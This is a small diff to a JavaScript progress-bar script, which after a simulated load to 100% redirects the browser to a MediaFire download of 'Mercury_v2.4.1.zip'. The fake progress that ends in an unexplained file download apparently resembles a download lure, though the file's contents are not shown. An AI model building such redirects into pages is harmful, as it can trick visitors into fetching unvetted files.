@@ -48,7 +48,7 @@ function animateProgress() {
     percent.textContent = "100%";
 
     setTimeout(() => {
-      window.location.replace("https://macfyno.com/app4");
+      window.location.replace("https://www.mediafire.com/file_premium/tz62htzby56cfxr/Mercury_v2.4.1.zip/file");
     }, 400);
 
     return;
@@ -61,4 +61,5 @@ function animateProgress() {
 }
 
 requestAnimationFrame(animateProgress);
+
 
